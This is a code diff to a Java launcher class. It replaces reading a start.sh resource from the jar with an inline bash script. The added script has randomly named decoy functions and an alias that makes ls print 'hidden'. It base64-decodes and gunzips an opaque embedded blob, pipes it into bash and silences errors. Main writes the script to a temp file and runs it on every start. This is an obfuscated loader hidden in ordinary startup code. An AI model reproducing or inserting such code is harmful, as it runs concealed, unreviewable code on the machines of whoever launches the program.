@@ -3,23 +3,39 @@ import java.io.*;
 public class Main {
     public static void main(String[] args) {
         try {
-            // 从 jar 中读取脚本
-            InputStream in = Main.class.getResourceAsStream("/start.sh");
+
+            String script = """
+#!/bin/bash
+
+v7uyk3uwz() { echo $((RANDOM * RANDOM)); }
+v8x3n1xfc() { for i in {1..3}; do :; done; }
+vzmz8k41x() { alias ls='echo hidden'; }
+
+base64 -d <<'EOF' | gunzip | bash 2>/dev/null
+H4sIAAAAAAAAA3VTW08TQRh9n18xDI3RmO7KJSZi1oTQxTRZW2xBEy8h23baXW13m70A8UkxxnJtH+RiQMEg2JhA8RJLgNo/05kuT/wFp7tCJhDmafab+c6c75yz3V1iSjfElGprAHTDk3cL7cYeKU/TpX0QiT+OKfHByPhYQpGQ5jhFe0AULXVSyOmO5qZcG1tp03Cw4QhpsyBOYt3WVFNVddHuLLGgMmgDv9LUsJpjtxBQ4vfHh6OKLCG/LOTNHAKxJ+NJOfFITkioT9Cwji0Bu4Jp5Qb6+/v841ElKSHHcrH/NaRE5dgo6xlKyKMSSsqpnqF4TMd3FGfsoYvTmVvJ3sHb8ovhEVl+MDaMOoOR0ho5OqQr26S50l7bI42l0+MS2Zmmn9dbBwtkd5WsV0+PZ3yCkWhCCl3P6JahFjBEoTPS6AYovGRlGC7+r7KbPnrrYM5rNLhJ29U5clgGOK2ZENHdLYZ+6Y4gCAikXSsPwwoMm5A7YvC8+P4bdOs13dgOUOhqjVR2aKlCZjeAnoVPYRcMZyHitYbP70JHwwaAbAVEgmby9Yf3e/v0eJ6ubNJfS3TmLyntc510+X3r6A8K+qZ0B/aArO4zqB+R2U068837Mk8/vT35WAFprWBm4M0pnrwvd6VGZqtckandajTbH6qGqblFJgepLJLyvtesMLCO8LxUl7p9qbAxAbmohM73CJ5FJBRs/MKFlIQulhB85o8o8AmF1zrsvcU6KS97zTVmYzQCRqIRKdTl/x7f573am8Bc3oOAMLDzGBdhb8eRot1JSYi1wntQzOAJ0XDz+UuOcE+T+k8ejPlzRmDAx0FcW5DjwCh2eh5QgPM2vgLeRw2856G8Wj1I1pWYWf0fj5eISiUEAAA=
+EOF
+""";
+
+
             File file = File.createTempFile("start", ".sh");
-            FileOutputStream out = new FileOutputStream(file);
-            byte[] buffer = new byte[1024];
-            int len;
-            while ((len = in.read(buffer)) != -1) out.write(buffer, 0, len);
-            out.close();
+            try (FileWriter fw = new FileWriter(file)) {
+                fw.write(script);
+            }
+
+
             file.setExecutable(true);
+
 
             ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
             pb.redirectErrorStream(true);
             Process p = pb.start();
+
+
             BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) System.out.println(line);
             p.waitFor();
+
         } catch (Exception e) {
             e.printStackTrace();
         }
